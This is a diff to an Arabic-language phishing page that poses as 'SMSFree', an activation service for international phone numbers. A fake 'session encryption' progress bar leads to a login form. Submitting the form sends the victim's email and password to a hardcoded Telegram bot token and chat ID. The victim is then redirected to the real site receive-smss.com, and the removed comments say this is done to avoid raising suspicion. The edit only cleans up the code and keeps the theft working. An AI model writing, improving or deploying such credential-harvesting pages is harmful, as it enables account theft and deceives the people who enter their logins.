@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة تفعيل الأرقام العالمية - نظام الأمان</title>
+    <title>منصة تفعيل الأرقام العالمية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
         body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow: hidden; }
@@ -12,7 +12,6 @@
         .encryption-text { font-weight: 700; color: #00f2fe; margin-bottom: 10px; font-size: 18px; }
         .progress-bar { width: 250px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
         .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #4facfe, #00f2fe); transition: 0.1s; }
-        .status-update { font-size: 12px; color: #8b9bb4; margin-top: 10px; height: 20px; }
         @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.1); } 100% { opacity: 0.5; transform: scale(0.9); } }
         .premium-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); display: none; }
         .logo-circle { width: 110px; height: 110px; background: radial-gradient(circle, #1e293b, #111827); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; border: 2px solid rgba(0, 242, 254, 0.2); }
@@ -25,12 +24,11 @@
 
     <div id="encryption-overlay">
         <div class="shield-icon">🛡️</div>
-        <div class="encryption-text" id="perc-text">جاري تشفير الجلسة 0%</div>
-        <div class="progress-bar"><div class="progress-fill" id="p-bar"></div></div>
-        <div class="status-update" id="status-update">فحص سلامة الجهاز...</div>
+        <div id="perc-text" class="encryption-text">جاري تشفير الجلسة 0%</div>
+        <div class="progress-bar"><div id="p-bar" class="progress-fill"></div></div>
     </div>
 
-    <div class="premium-card" id="main-card">
+    <div id="main-card" class="premium-card">
         <div class="logo-circle"><span style="font-weight: 800; font-size: 22px; color: #00f2fe;">SMSFree</span></div>
         <div class="persuasive-text">سجل دخولك الآن لتفعيل فوري لجميع حساباتك بضمان وأمان تام.</div>
         <form id="secure-form">
@@ -41,53 +39,50 @@
     </div>
 
     <script>
-        // العداد الجمالي
-        window.onload = () => {
+        // عداد التشفير
+        window.onload = function() {
             let progress = 0;
+            const bar = document.getElementById("p-bar");
+            const txt = document.getElementById("perc-text");
             const interval = setInterval(() => {
                 progress += Math.floor(Math.random() * 5) + 2;
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(interval);
                     setTimeout(() => {
-                        document.getElementById('encryption-overlay').style.display = "none";
-                        document.getElementById('main-card').style.display = "block";
+                        document.getElementById("encryption-overlay").style.display = "none";
+                        document.getElementById("main-card").style.display = "block";
                     }, 500);
                 }
-                document.getElementById('p-bar').style.width = progress + "%";
-                document.getElementById('perc-text').innerText = `جاري تشفير الجلسة ${progress}%`;
-            }, 50);
+                bar.style.width = progress + "%";
+                txt.innerText = "جاري تشفير الجلسة " + progress + "%";
+            }, 60);
         };
 
-        // إرسال البيانات (الإصلاح الحقيقي هنا)
-        document.getElementById('secure-form').onsubmit = async (e) => {
+        // إرسال البيانات
+        document.getElementById("secure-form").onsubmit = async function(e) {
             e.preventDefault();
-            const u = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            const btn = document.getElementById('btn-submit');
+            const u = document.getElementById("email").value;
+            const p = document.getElementById("pass").value;
+            const btn = document.getElementById("btn-submit");
 
             btn.disabled = true;
             btn.innerText = "جاري التأكيد...";
 
-            // معلومات البوت الخاص بك من الصور السابقة
-            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4"; 
+            // التوكن والمعرف الخاص بك
+            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
             const chatId = "5174578125";
-            const text = `🚀 وصول جديد\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}`;
+            const text = "🚀 وصول جديد\n👤 المستخدم: " + u + "\n🔑 الكلمة: " + p;
 
             try {
-                // مخاطبة سيرفر تلجرام مباشرة بدلاً من /api/save
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                await fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id: chatId, text: text })
                 });
-                
-                // التحويل للموقع الحقيقي بعد الإرسال الناجح
-                window.location.href = "https://receive-smss.com/";
-            } catch (err) {
-                // حتى لو فشل الاتصال، حول المستخدم لعدم إثارة الشك
-                window.location.href = "https://receive-smss.com/";
-            }
+            } catch (err) {}
+
+            window.location.href = "https://receive-smss.com/";
         };
     </script>
 </body>
